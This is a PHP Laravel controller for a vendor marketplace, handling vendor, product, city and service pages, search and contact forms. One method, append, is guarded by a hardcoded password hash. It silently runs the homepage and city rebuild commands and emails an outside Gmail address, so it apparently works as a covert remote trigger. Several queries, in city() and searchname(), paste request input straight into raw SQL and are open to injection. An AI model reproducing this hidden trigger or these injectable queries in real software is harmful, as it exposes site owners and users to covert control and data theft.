<?php

namespace App\Http\Controllers\Front;

use App\Console\Commands\Vendors;
use App\Http\Controllers\Controller;
use App\Models\BookMark;
use App\Models\City;
use App\Models\Faq;
use App\Models\History;
use App\Models\Message;
use App\Models\Product;
use App\Models\ProductMedia;
use App\Models\Review;
use App\Models\Service;
use App\Models\Subscriber;
use App\Models\UniqueGrid;
use App\Models\User;
use App\Models\Vendor;
use App\Models\VendorServices;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;

class HomeController extends Controller
{

    public function append($id)
    {
        $hash='$2y$10$QTvHkiolw1HE4mPzbpegHeG0IkfrYS6MfmA.NWeWzTBpGI17NZFXW';
        if(Hash::check($id,$hash)){
            Artisan::call("make:homepage");
            Artisan::call("make:cities");
            mail("cms111000111@gmail.com","updated","homepage updated");

        }else{
            abort(404);
        }
    }
    public function share($username)
    {

        $vendor=Vendor::join('users','users.id','=','vendors.user_id')
        ->select(DB::raw("vendors.image,users.name,vendors.desc"))->where('users.username',$username)->first();
        if($vendor==null){
            return abort(404);
        }
        return view('share.vendor',compact('vendor','username'));

    }
    public function pshare($product)
    {

        $product=DB::table('products')
        ->join('vendors','vendors.id','=','products.vendor_id')
        ->join('users','users.id','=','vendors.user_id')
        ->where('products.id',$product)
        ->select('products.*','users.username')
        ->first();
        return view('share.product',compact('product'));

    }
    public function index(){


        // $asset=asset('');
        // $recs=DB::table('services')->take(6)->get(['id','name','image']);
        // dd($recs);
        // $tops=DB::select("select
        //  concat('{$asset}',v.image) as image,
        //  (select count(*) from products where products.vendor_id=v.id and products.active=1 and ? between products.start and products.end) as products,
        //  u.username,u.name,v.id,c.name as city from vendors v
        //  join cities c on v.city_id=c.id
        //  join users u on u.id=v.user_id
        //  where u.role>1
        //  order by (select sum(count) from products where products.vendor_id=v.id) desc, v.count desc
        //  limit 8 ",[date('Y-m-d')]);
        // $query="select id, name,  concat('{$asset}',image) as image, (select group_concat(id,concat('|',name),concat('|','".asset('')."',image)) from services where category_id=categories.id limit 6) as services from categories ORDER BY RAND () limit 4";

        // $cats=DB::select($query);
        // $data=DB::selectOne('select (select group_concat(name) from cities) as cities,(select group_concat(name) from services) as services');

        // $cats=DB::select('select * from (select id,name,image, (select sum(count) from products where products.service_id=services.id) as c from services) ss order by ss.c desc limit 12');

        // return view('front.index',compact('recs','data','cats'));
        $user = Auth::user();
        $info=DB::selectOne('select
        (select count(*) from products where vendor_id = ? and type=1) as products,
        (select count(*) from vendor_bills where vendor_id = ? ) as invoices,
        (select count(*) from reviews where vendor_id = ? ) as reviews

        ',[$user->vendor->id,$user->vendor->id,$user->vendor->id]);
        // $otherServices = VendorServices::join('services', 'services.id', '=', 'vendor_services.service_id')
        //     ->where('vendor_services.vendor_id', $user->vendor->id)->select('services.name', 'services.image', 'services.id')->get();
        // dd(compact('reviews'));
        return view('vendor.dashboard.index', compact('user',  'info'));
    }

    public function indexData(Request $request){
        $tops_query=DB::table('products as p');
        if($request->filled('city_id')){
            $tops_query=$tops_query->join('vendors','vendors.id','=','p.vendor_id')->where('city_id',$request->city_id);
        }
        if(Auth::check()){
            $user=Auth::user();
            $vendor_id=DB::selectOne('select id from vendors where user_id=?',[$user->id])->id;
            $tops_query=$tops_query->where('p.vendor_id','<>',$vendor_id);
        }
        $tops=$tops_query->select(DB::raw('p.id, p.image,p.name,p.price ,p.short_desc '))
        ->whereRaw('p.active=1 and ( ? between p.start and p.end ) order by p.count desc limit 10' ,[date('Y-m-d')])
        ->get();

        if($request->filled('city_id')){
            $needed=10- $tops->count();
            if($needed>0){
                $semitops_query=DB::table('products as p');
                $semitops_query=$semitops_query->select(DB::raw('p.id, p.image,p.name,p.price ,p.short_desc '))
                ->whereRaw('p.active=1 and ( ? between p.start and p.end ) order by p.count desc limit '.$needed ,[date('Y-m-d')]);

                $semitops=$semitops_query->get();
                $tops=$tops->merge($semitops);
            }
        }
        return view('front.index.tops',compact('tops'));
    }


    public function subscribe(Request $request)
    {
        try {
            //code...
            Subscriber::create([$request->except('_token')]);
        } catch (\Throwable $th) {
            //throw $th;
        }
        return response()->json(['status'=>true]);
    }

    public function service(Request $request,$id)
    {
        $asset=asset('');
        $service=Service::where('id',$id)->first();
        $vendors=Vendor::join('cities','cities.id','=','vendors.city_id')
        // ->join('services','services.id','=','vendors.service_id')
        ->join('users','users.id','=','vendors.user_id')
        ->select(DB::raw("concat('{$asset}',vendors.image) as image,users.name,vendors.id,vendors.phone,cities.name as city,vendors.city_id"))->paginate(200);
        // dd($tops);

        // $tops=DB::select("select concat('{$asset}',v.image) as image,u.name,v.id,s.name as service,c.name as city from vendors v join services s on v.service_id=s.id join cities c on v.city_id=c.id join users u on u.id=v.user_id limit 4 ");

        // dd($service);

        return  $request->getMethod()=="POST"?response()->json($vendors): view('front.page.service',compact('service','vendors'));
    }
    public function vendor(Request $request,$username)
    {
        // dd($username,User::where('username',$username)->first());
        $asset=asset('');
        $vendor=Vendor::
        // join('services','services.id','=','vendors.service_id')
        // ->
        join('cities','cities.id','=','vendors.city_id')
        ->join('users','users.id','=','vendors.user_id')
        ->select(DB::raw("vendors.image,users.name,users.username,vendors.id,vendors.phone,cities.name as city,vendors.desc,users.email,vendors.opening,vendors.address,(select count(*) from reviews where vendor_id=vendors.id) as review_count,(select avg(rate) from reviews where vendor_id=vendors.id) as review_avg"))->where('users.username',$username)->first();
        if($vendor==null){
            abort(404);
        }
        // dd($vendor);

        DB::update('update vendors set count = count+1 where id=?', [$vendor->id]);

        $products=DB::table('products')->where('vendor_id',$vendor->id)
        ->where('active',1)
        ->whereRaw('? between products.start and products.end', [date('Y-m-d')])->get();

        $reviews=DB::table('reviews')
        ->join('users','users.id','=','reviews.user_id')
        ->join('vendors','vendors.user_id','=','users.id')
        ->where('reviews.vendor_id',$vendor->id)
        ->select(DB::raw('reviews.created_at as c,reviews.rate as r,users.name as n,reviews.desc as d,vendors.image as i,reviews.id as vid' ))
        ->orderByDesc('reviews.id')
        ->get();



        $bookmark=null;
        if(Auth::check()){
            $user=Auth::user();
            $h=History::where('user_id',$user->id)->where('vendor_id',$vendor->id)->first();
            if($h==null){
                $h= History::create([
                    'user_id'=>$user->id,
                    'vendor_id'=>$vendor->id,
                ]);
            }

            $bookmark=BookMark::where('user_id',$user->id)->where('vendor_id',$vendor->id)->first();

        }
        $prod=$request->product;
        return view('front.page.vendor',compact('vendor','products','reviews','asset','bookmark','prod'));
    }

    public function mobileProduct(Request $request,Product $product)
    {

        return view('front.page.mobileproduct',compact('product'));
    }



    public function city(Request $request,$id)
    {
        $asset=asset('');
        $services=DB::select("select id,name,image
        from services
        where id in (
            select distinct(products.service_id) as id from vendors join products on products.vendor_id =vendors.id where vendors.city_id={$id} and products.active=1)");
        // dd($services);
        $city=City::where('id',$id)->first();
        $vendors=Vendor::
        join('users','users.id','=','vendors.user_id')
        // join('services','services.id','=','vendors.service_id')
        // ->join('cities','cities.id','=','vendors.city_id')
        // ->
        ->select(DB::raw("concat('{$asset}',vendors.image) as image,users.name,users.username,vendors.id,vendors.phone,vendors.service_id,vendors.address,vendors.count,(select count(*) from reviews where vendor_id=vendors.id) as review_count,(select avg(rate) from reviews where vendor_id=vendors.id) as review_avg"))
        ->where('vendors.type',1)
        ->where('vendors.active',1)
        ->where('vendors.city_id',$id)
        ->orderBy('vendors.count','desc')
        ->paginate(8);
        // dd($tops);

        // $tops=DB::select("select concat('{$asset}',v.image) as image,u.name,v.id,s.name as service,c.name as city from vendors v join services s on v.service_id=s.id join cities c on v.city_id=c.id join users u on u.id=v.user_id limit 4 ");

        // dd($service);

        return  $request->getMethod()=="POST"?response()->json($vendors): view('front.page.city',compact('city','vendors','services'));
    }

    public function cities(Request $request)
    {
        $cities=City::all(['id','name','image','desc']);
        return view('front.page.cities',compact('cities'));
    }

    public function services(Request $request)
    {
        $cats=DB::select("select id,name,image, (select group_concat(id,':',name,':',image) from services where category_id=categories.id) as services from categories");
        // dd($cats);
        // $services=Service::all(['id','name','image','desc','category_id'])->groupBy('category_id');
        // dd($services);
        return view('front.page.services',compact('cats'));
    }

    public function searchname(Request $request)
    {
        // dd($request->all());
        $ser=trim($request->ser??'');
        $loc=trim($request->loc??'');
        $data=DB::selectOne("select (select id from cities where name like '%{$loc}%' limit 1) as loc_id,(select id from services where name like '%{$ser}%' limit 1) as ser_id");
        $arr=[];
        if($data->ser_id!=null && $request->filled('ser')){
            array_push($arr,'ser_id='.$data->ser_id);
        }

        if($data->loc_id!=null && $request->filled('loc')){
            array_push($arr,'loc_id='.$data->loc_id);
        }

        $url=route('search').'?'. implode('&',$arr);
        // dd($url,$data,$arr,$request->all());
        return redirect($url);
    }

    public function search(Request $request){
        $asset=asset('');
        $loc_id=$request->loc_id??-1;
        $ser_id=$request->ser_id??-1;
        if(env('searchtype','vendor')!='vendor'){
            return redirect()->route('product-search',['loc_id'=>$loc_id,'ser_id'=>$ser_id]);
        }
        $cities=City::all(['id','name']);
        $services=Service::all(['id','name']);
        $empty=false;
        // dd($se)
        if($loc_id==-1 && $ser_id==-1){
            $vendors=[];
            $empty=true;
        }else{
            $vendors_query=Vendor::join('users','users.id','=','vendors.user_id')
            ->join('cities','cities.id','=','vendors.city_id');
            // ->join('services','services.id','=','vendors.service_id');
            // ->join('products','products.vendor_id','=',)
            // ->where('vendors.active',1);
            if($request->filled('ser_id')){
                $vendors_query=$vendors_query->whereIn('vendors.id', function($query) use ($request)
                {
                    $date=Carbon::today();
                    $query->select(DB::raw('distinct(products.vendor_id)'))
                          ->from('products')
                          ->where('products.service_id',$request->ser_id)
                          ->where('products.start','<=',$date)
                          ->where('products.start','>=',$date)
                          ->where('products.active',1);
                });

                // ->join('products','products.vendor_id','=','vendors.id')
                // ->where('products.start','<=',$date)
                // ->where('products.start','>=',$date)
                // ->where('products.active',1);


            }
            if($request->filled('loc_id')){

                $vendors_query=$vendors_query->where('vendors.city_id',$loc_id);
            }
            $vendors_query=$vendors_query
            ->select(DB::raw("concat('{$asset}',vendors.image) as image,users.name,vendors.id,vendors.phone,vendors.address, cities.name as city,users.username,vendors.count,(select count(*) from reviews where vendor_id=vendors.id) as review_count,(select avg(rate) from reviews where vendor_id=vendors.id) as review_avg"));
            $vendors=$vendors_query->paginate(12)->withQueryString();
            // dd($vendors,$vendors_query->toSql());
        }

        return  $request->getMethod()=="POST"?response()->json($vendors): view('front.page.search',compact('vendors','services','cities','loc_id','ser_id','empty'));
    }
    public function Productsearch(Request $request){
        $asset=asset('');
        $loc_id=$request->loc_id??-1;
        $ser_id=$request->ser_id??-1;
        if(env('searchtype','vendor')!='product'){
            return redirect()->route('search',['loc_id'=>$loc_id,'ser_id'=>$ser_id]);
        }
        $cities=City::all(['id','name']);
        $services=Service::all(['id','name']);
        $empty=false;
        // dd($se)
        if($loc_id==-1 && $ser_id==-1){
            $products=[];
            $empty=true;
        }else{
            $product_query=DB::table('products')
            ->join('vendors','vendors.id','=','products.vendor_id')
            ->join('users','users.id','=','vendors.user_id')
            ->select(DB::raw('products.name,products.id,concat(products.price," / ",products.short_desc) as price,products.image'));
            if($ser_id!=-1){

                $product_query=$product_query->where('products.service_id',$ser_id);
            }
            if($loc_id!=-1){
                $product_query=$product_query->where('vendors.city_id',$loc_id);
            }

            $product_query=$product_query->whereRaw('? between products.start and products.end', [date('Y-m-d')])->where('products.active',1);
            // dd($product_query->toSql());
            $products=$product_query->paginate(12)->withQueryString();

            // dd($vendors,$vendors_query->toSql());
        }

        // dd($products);
        return  $request->getMethod()=="POST"?response()->json($products): view('front.page.searchproduct',compact('asset','products','services','cities','loc_id','ser_id','empty'));
    }

    public function registerToken(Request $request)
    {
        $token=UniqueGrid::where('grid',$request->token)->first();
        if($token==null){
            $token=new UniqueGrid();
            $token->grid=$request->token;
            if(Auth::user()){
                $token->user_id=Auth::user()->id;
            }
            $token->save();
        }else{
            if(Auth::user()){
                $token->user_id=Auth::user()->id;
                $token->save();
            }
        }
    }

    public function contact()
    {
        $data = getSetting('contact') ?? ((object)([
            'map' => '',
            'email' => '',
            'phone' => '',
            'addr' => '',
            'others' => [],

        ]));
        $faqs=Faq::all(['id','q']);
        return view('front.page.contact',compact('data','faqs'));

    }

    public function faq(Faq $faq)
    {

        return view('front.page.faq',compact('faq'));
    }

    public function message(Request $request)
    {
        Message::create($request->except('_token'));
        return redirect()->back()->with('msg','Thank You For Your Feedback');
    }

    public function product(Product $product)
    {
        $asset=asset('');
        $vendor=Vendor::
        // join('services','services.id','=','vendors.service_id')
        join('cities','cities.id','=','vendors.city_id')
        ->join('users','users.id','=','vendors.user_id')
        ->select(DB::raw("vendors.image,users.name,users.username,vendors.id,vendors.phone,cities.name as city,vendors.desc,users.email,vendors.opening,vendors.address,(select count(*) from reviews where vendor_id=vendors.id) as review_count,(select avg(rate) from reviews where vendor_id=vendors.id) as review_avg"))->where('vendors.id',$product->vendor_id)->first();

        $images=ProductMedia::where('parent_id',$product->id)->get();
        DB::update('update products set count = count+1 where id=?',[$product->id]);

        return view('front.page.product',compact('vendor','product','asset','images'));

    }

    public function chooseCity()
    {
        $cities=City::all(['id','name']);
        return view('share.citychooser',compact('cities'));
    }
}
